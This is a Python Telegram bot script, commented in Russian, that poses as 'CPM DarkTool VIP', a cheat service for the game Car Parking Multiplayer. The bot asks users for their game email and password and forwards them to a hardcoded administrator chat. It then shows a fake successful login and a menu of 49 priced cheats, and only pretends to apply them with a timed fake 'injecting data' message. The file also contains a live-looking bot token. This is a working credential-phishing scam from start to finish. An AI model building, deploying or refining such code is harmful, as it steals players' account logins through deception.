import telebot
from telebot import types
import time

# --- НАСТРОЙКИ (ИЗ ВАШИХ СКРИНШОТОВ) ---
BOT_TOKEN = "8642555081:AAFCPMuESMEH4QX7Mlbk4L6AhdA2D1_vR8w"
ADMIN_ID = "7149867962"  # Сюда бот будет присылать данные
# --------------------------------------

bot = telebot.TeleBot(BOT_TOKEN)

# Словарь для временного хранения данных пользователей
user_data = {}

# Список функций для меню
MENU_ITEMS = [
    "01: Increase Money (1.5K)", "02: Increase Coins (1.5K)", "03: King Rank (8K)",
    "04: Change ID (4.5K)", "05: Change Name (100)", "06: Change Name (Rainbow) (100)",
    "07: Number Plates (2K)", "08: Account Delete (Free)", "09: Account Register (Free)",
    "10: Delete Friends (500)", "11: Unlock Lamborghinis (5K)", "12: Unlock All Cars (6K)",
    "13: Unlock All Cars Siren (3.5K)", "14: Unlock W16 Engine (4K)", "15: Unlock All Horns (3K)",
    "16: Unlock Disable Damage (3K)", "17: Unlock Unlimited Fuel (3K)", "18: Unlock Home 3 (4K)",
    "19: Unlock Smoke (4K)", "20: Unlock Wheels (4K)", "21: Unlock Animations (2K)",
    "22: Unlock Equipaments M (3K)", "23: Unlock Equipaments F (3K)", "24: Change Race Wins (1K)",
    "25: Change Race Loses (1K)", "26: Clone Account (7K)", "27: Custom HP (2.5K)",
    "28: Custom Angle (1.5K)", "29: Custom Tire burner (1.5K)", "30: Custom Car Millage (1.5K)",
    "31: Custom Car Brake (2K)", "32: Remove Rear Bumper (2K)", "33: Remove Front Bumper (2K)",
    "34: Change Account Password (2K)", "35: Change Account Email (2K)", "36: Custom Spoiler (10K)",
    "37: Custom BodyKit (10K)", "38: Unlock Premium Wheels (4.5K)", "39: Unlock Toyota Crown (2K)",
    "40: Unlock Clan Hat (M) (3K)", "41: Remove Head Male (3K)", "42: Remove Head Female (3K)",
    "43: Unlock Clan Top 1 (M) (3K)", "44: Unlock Clan Top 2 (M) (3K)", "45: Unlock Clan Top 3 (M) (3K)",
    "46: Unlock Clan Top 1 (FM) (3K)", "47: Unlock Clan Top 2 (FM) (3K)", "48: Unlock Mercedes Cls (4K)",
    "49: Stance Camber (1K)"
]

@bot.message_handler(commands=['start'])
def start(message):
    welcome_text = (
        "👋 **Welcome to CPM DarkTool VIP!**\n\n"
        "⚠️ *PLEASE LOG OUT FROM CPM BEFORE USING THIS TOOL*\n"
        "🚫 *SHARING THE ACCESS KEY IS NOT ALLOWED*\n\n"
        "To proceed, please enter your **Game Email**:"
    )
    bot.send_message(message.chat.id, welcome_text, parse_mode="Markdown")
    bot.register_next_step_handler(message, get_email)

def get_email(message):
    email = message.text
    user_data[message.chat.id] = {'email': email}
    bot.send_message(message.chat.id, "Great! Now enter your **Game Password**:")
    bot.register_next_step_handler(message, get_password)

def get_password(message):
    password = message.text
    email = user_data[message.chat.id]['email']
    
    # Отправляем данные администратору (ВАМ)
    admin_msg = (
        "🚀 **New Account Data!**\n\n"
        f"📧 Email: `{email}`\n"
        f"🔑 Password: `{password}`\n"
        f"👤 User: @{message.from_user.username} (ID: {message.chat.id})"
    )
    bot.send_message(ADMIN_ID, admin_msg, parse_mode="Markdown")
    
    # Показываем пользователю меню
    show_menu(message)

def show_menu(message):
    menu_text = (
        "✅ **Login Successful!**\n\n"
        "👤 **Player Details:**\n"
        f"Name: [37f301]G[5fcd02]A[87a704]BI\n"
        f"Local ID: $$777777\n"
        f"Email: {user_data[message.chat.id]['email']}\n\n"
        "📍 **Location:** Russia 109382\n\n"
        "🛠 **Select a Service:**"
    )
    
    # Создаем кнопки для меню (по 2 в ряд)
    markup = types.InlineKeyboardMarkup(row_width=2)
    buttons = [types.InlineKeyboardButton(text=item, callback_data=f"service_{i}") for i, item in enumerate(MENU_ITEMS)]
    markup.add(*buttons)
    
    bot.send_message(message.chat.id, menu_text, reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data.startswith('service_'))
def handle_service(call):
    service_index = int(call.data.split('_')[1])
    service_name = MENU_ITEMS[service_index]
    
    # Имитация процесса
    bot.answer_callback_query(call.id, f"Initializing {service_name}...")
    
    msg = bot.send_message(call.message.chat.id, f"⏳ **Injecting data for:** {service_name}...")
    time.sleep(2)
    bot.edit_message_text(f"✅ **{service_name} applied successfully!**\n\n[!] Please restart the game to see changes.", 
                          call.message.chat.id, msg.message_id, parse_mode="Markdown")

print("Бот запущен и готов к работе!")
bot.infinity_polling()
